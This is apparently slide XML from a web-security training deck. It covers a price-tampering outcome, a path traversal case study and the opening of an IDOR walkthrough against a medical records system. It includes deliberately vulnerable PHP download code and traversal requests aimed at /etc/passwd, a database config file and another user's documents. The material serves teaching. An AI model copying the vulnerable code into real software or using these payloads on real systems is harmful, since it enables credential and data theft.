      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="19" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515797" y="6902053"/>
            <a:ext cx="185976" cy="148828"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3815120" y="6895148"/>
            <a:ext cx="1488519"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Result:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3815120" y="7137797"/>
            <a:ext cx="7299484" cy="272194"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attacker pays $1 for $1,550 worth of products</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Company loses $1,549 per fraudulent transaction</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02449" y="958096"/>
            <a:ext cx="4461867"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Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>6.4 File Access via Path Traversal</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1352788"/>
            <a:ext cx="2813923"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Scenario: Document Management System</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1561386"/>
            <a:ext cx="1789152"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Vulnerable File Download:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1832372"/>
            <a:ext cx="7825502" cy="1939171"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2456"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="1832372"/>
            <a:ext cx="7836694" cy="1939171"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 877"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="1917383"/>
            <a:ext cx="7609999" cy="1769150"/>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&lt;?php</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PHP - VULNERABLE CODE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$file = $_GET['file'];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$filepath = "/var/www/uploads/" . $file;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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NO PATH VALIDATION!</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if (file_exists($filepath))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header('Content-Type: application/pdf');</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readfile($filepath);</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else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echo "File not found";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?&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="3856553"/>
            <a:ext cx="1488519"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Attack:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="4127540"/>
            <a:ext cx="1913811" cy="2072402"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2489"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523417" y="4248507"/>
            <a:ext cx="1671876" cy="371951"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Step 1: Normal file download</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3523417" y="4684157"/>
            <a:ext cx="1671876" cy="1122640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4243"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3517821" y="4684157"/>
            <a:ext cx="1683068" cy="1122640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1515"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3631168" y="4769168"/>
            <a:ext cx="1456373" cy="952619"/>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GET /download.php?file=invoice_123.pdf</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Cookie: session=user_token</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Downloads: /var/www/uploads/invoice_123.pdf</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5372933" y="4127540"/>
            <a:ext cx="1913930" cy="2072402"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2489"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5493901" y="4248507"/>
            <a:ext cx="1671995" cy="371951"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Step 2: Path traversal attack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5493901" y="4684157"/>
            <a:ext cx="1671995" cy="1258729"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3784"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5488305" y="4684157"/>
            <a:ext cx="1683187" cy="1258729"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1352"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5601653" y="4769168"/>
            <a:ext cx="1456492" cy="1088708"/>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Access files outside uploads directory</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GET /download.php?file=../../../etc/passwd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Cookie: session=user_token</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Downloads: /etc/passwd (system password file!)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7343537" y="4127540"/>
            <a:ext cx="1913811" cy="2072402"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2489"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7464504" y="4248507"/>
            <a:ext cx="1671876" cy="371951"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Step 3: Access sensitive application files</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7464504" y="4684157"/>
            <a:ext cx="1671876" cy="1394817"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3415"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7458908" y="4684157"/>
            <a:ext cx="1683068" cy="1394817"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1220"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7572256" y="4769168"/>
            <a:ext cx="1456373" cy="1224796"/>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Access database configuration</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GET /download.php?file=../../config/database.php</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Cookie: session=user_token</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Response contains database credentials</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9314021" y="4127540"/>
            <a:ext cx="1913930" cy="2072402"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2489"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9434989" y="4248507"/>
            <a:ext cx="1671995" cy="371951"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="squar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Step 4: Access other users' files</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9434989" y="4684157"/>
            <a:ext cx="1671995" cy="1394817"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3415"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Shape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9429393" y="4684157"/>
            <a:ext cx="1683187" cy="1394817"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1220"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9542740" y="4769168"/>
            <a:ext cx="1456492" cy="1224796"/>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Access another user's private documents</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GET /download.php?file=../user_456/private_contract.pdf</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Cookie: session=user_token</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Downloads victim's confidential contract</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Shape 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="6263640"/>
            <a:ext cx="7825502" cy="1007745"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4727"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B3E5FF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="30" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515797" y="6355556"/>
            <a:ext cx="185976" cy="148828"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3815120" y="6348651"/>
            <a:ext cx="1488519"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Impact:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3815120" y="6591300"/>
            <a:ext cx="7299484" cy="544388"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>System file disclosure</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Database credential theft</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Access to all users' files</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Complete system compromise</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621863"/>
            <a:ext cx="4572833" cy="390049"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2450" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>IDOR Exploitation Walkthrough</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="1154311"/>
            <a:ext cx="1461135" cy="192881"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 20709"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="802838" y="1189911"/>
            <a:ext cx="1318498" cy="121682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="950"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>MEDICAL RECORDS SYSTEM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="1427202"/>
            <a:ext cx="13167360" cy="151924"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Complete step-by-step demonstration of exploiting Insecure Direct Object Reference vulnerabilities to extract sensitive medical records through sequential ID enumeration.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="1730335"/>
            <a:ext cx="1872377" cy="234077"/>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Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Setup &amp; Discovery</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="2035612"/>
            <a:ext cx="6438662" cy="151924"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
